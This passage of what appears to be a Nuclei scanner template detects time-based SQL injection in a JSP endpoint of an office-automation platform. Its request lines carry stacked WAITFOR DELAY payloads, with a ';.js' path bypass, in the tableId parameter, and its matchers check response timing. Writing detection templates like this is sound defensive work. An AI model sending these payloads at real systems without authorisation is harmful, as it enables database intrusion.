      - "{{BaseURL}}/defaultroot/platform/custom/custom_database/dropdownselect/selectCommentField.jsp;.js?tableId=1;WAITFOR%20DELAY%20'0:0:6'--%20-"
      - "{{BaseURL}}/defaultroot/platform/custom/custom_database/dropdownselect/selectCommentField.jsp;.js?tableId=1;WAITFOR%20DELAY%20'0:0:9'--%20-"
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"